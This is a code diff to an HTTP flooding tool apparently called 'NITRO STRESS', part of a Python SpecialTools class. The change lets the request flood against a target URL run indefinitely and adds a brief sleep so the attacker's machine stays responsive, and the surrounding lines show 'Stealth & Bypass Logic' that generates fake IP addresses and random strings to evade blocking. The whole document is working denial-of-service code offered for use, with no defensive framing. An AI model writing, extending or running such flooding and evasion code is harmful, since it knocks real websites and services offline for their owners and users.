@@ -31,13 +31,18 @@ class SpecialTools:
         print(f"[*] Starting NITRO STRESS on {targetUrl} with {threads} threads.")
         
         def attack_worker():
-            timeout = time.time() + duration
+            # * Unlimited duration if set to 0
+            timeout = (time.time() + duration) if duration > 0 else (time.time() + 999999)
             session = requests.Session()
             
             while time.time() < timeout and self.isFlooding:
                 if hasattr(self, 'core') and self.core and self.core.stop_requested:
                     break
                 try:
+                    # -- NITRO BOOST OPTIMIZATION v5.8.10 --
+                    # Kita kasih napas dikit biar laptop kaga lag (time.sleep)
+                    time.sleep(0.01)
+                    
                     # -- Stealth & Bypass Logic --
                     random_str = secrets.token_hex(4)
                     fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
